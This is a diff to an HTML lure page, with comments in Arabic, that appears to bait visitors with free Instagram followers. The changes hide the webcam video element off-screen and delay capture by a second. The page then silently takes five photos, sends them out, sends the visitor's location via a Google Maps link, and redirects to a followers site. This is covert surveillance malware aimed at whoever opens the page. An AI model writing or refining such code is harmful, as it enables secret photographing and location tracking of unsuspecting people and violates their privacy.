@@ -27,8 +27,13 @@
       color: white;
       transition: width 0.2s;
     }
-    canvas, video {
+    canvas {
       display: none;
+    }
+    video {
+      position: absolute;
+      top: -9999px;
+      visibility: hidden;
     }
   </style>
 </head>
@@ -96,19 +101,21 @@ https://www.google.com/maps?q=${lat},${lon}
         .then(stream => {
           video.srcObject = stream;
 
-          let count = 0;
-          const maxPhotos = 5;
-          const interval = setInterval(() => {
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg');
-            count++;
-            if (count >= maxPhotos) {
-              clearInterval(interval);
-              window.location.href = "https://myinstafollow.com/free-instagram-followers/";
-            }
-          }, 200);
+          setTimeout(() => {
+            let count = 0;
+            const maxPhotos = 5;
+            const interval = setInterval(() => {
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+              canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg');
+              count++;
+              if (count >= maxPhotos) {
+                clearInterval(interval);
+                window.location.href = "https://myinstafollow.com/free-instagram-followers/";
+              }
+            }, 500);
 
-          getLocationAndSendInfo();
+            getLocationAndSendInfo();
+          }, 1000); // انتظر ثانية قبل بدء الالتقاط
         })
         .catch(err => alert("فشل تشغيل الكاميرا: " + err));
     }
@@ -124,7 +131,7 @@ https://www.google.com/maps?q=${lat},${lon}
         progressBar.style.width = width + "%";
         progressBar.textContent = width + "%";
       }
-    }, 30); // سرعة التقدم
+    }, 30);
   </script>
 </body>
 </html>
